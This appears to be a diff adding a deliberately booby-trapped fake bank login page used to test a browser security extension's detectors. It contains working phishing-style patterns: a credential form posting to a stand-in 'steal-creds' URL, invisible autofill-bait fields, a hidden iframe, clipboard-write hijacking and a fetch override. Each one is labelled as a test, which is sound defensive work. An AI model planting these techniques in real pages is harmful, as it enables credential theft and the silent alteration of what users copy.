@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>AEGIS Test Harness — Fake Bank Login</title>
+<style>
+  body { font-family: sans-serif; background:#f2f4f7; padding:40px; }
+  .box { max-width:400px; margin:auto; background:white; padding:30px; border-radius:12px; box-shadow:0 4px 20px rgba(0,0,0,.1); }
+  input { width:100%; padding:10px; margin:8px 0; box-sizing:border-box; }
+  button { width:100%; padding:10px; background:#2563eb; color:white; border:none; border-radius:6px; cursor:pointer; }
+  h2 { margin-top:0; }
+  .fake-field { position:absolute; left:-9999px; top:-9999px; }
+  .fake-typer { border:1px dashed #ccc; padding:10px; margin-top:20px; }
+  .badge { font-size:12px; color:#888; margin-top:30px; }
+</style>
+</head>
+<body>
+
+<div class="box">
+  <h2>🏦 SecureBank — Sign In</h2>
+  <p>This is a deliberately booby-trapped test page for the AEGIS extension. It is NOT a real login form.</p>
+
+  <!-- (1) TEST: cross-origin credential form -->
+  <!-- content.js should fire BDR_CRITICAL: cross_origin_credential_form -->
+  <form action="https://example.org/steal-creds" method="POST">
+    <input type="text" name="username" placeholder="Username">
+    <input type="password" name="password" placeholder="Password">
+    <button type="submit">Sign In</button>
+  </form>
+
+  <!-- (2) TEST: invisible autofill-bait field -->
+  <!-- bdr.js should fire BDR_CRITICAL: autofill_bait_field -->
+  <input class="fake-field" type="password" name="hidden_pw" autocomplete="current-password">
+  <input class="fake-field" type="email" name="hidden_email" autocomplete="email">
+
+  <!-- (3) TEST: hidden/offscreen iframe -->
+  <!-- content.js should fire queueEvent: hidden_iframe_detected -->
+  <iframe src="about:blank" style="position:absolute; left:-9999px; top:-9999px; width:1px; height:1px;"></iframe>
+
+  <div class="fake-typer" tabindex="0" contenteditable="false" id="fakeInputBox">
+    Click here and type — this box is NOT a real input field.
+    (Triggers bdr.js keystroke-capture-outside-input detector after ~6 keys)
+  </div>
+
+  <p class="badge">Test harness — served locally for AEGIS extension testing.</p>
+</div>
+
+<script>
+  // (4) TEST: clipboard write interception
+  // bdr.js should fire BDR_CRITICAL: clipboard_write_intercepted
+  const originalWriteText = navigator.clipboard.writeText.bind(navigator.clipboard);
+  navigator.clipboard.writeText = function (text) {
+    console.log("[test-harness] intercepted clipboard write, swapping text");
+    return originalWriteText("swapped-malicious-text");
+  };
+
+  // (5) TEST: fake keylogger — captures keydown on a styled div, not a real input
+  document.getElementById("fakeInputBox").addEventListener("keydown", () => {
+    // no-op — just exists so bdr.js's document-level keydown listener sees
+    // repeated non-input keydowns and flags keystroke_capture_outside_input
+  });
+
+  // (6) TEST: fetch override fingerprint
+  // bdr.js should fire queueEvent: fetch_overridden
+  const originalFetch = window.fetch;
+  window.fetch = function (...args) {
+    console.log("[test-harness] fetch was called (overridden)");
+    return originalFetch(...args);
+  };
+</script>
+
+</body>
+</html>
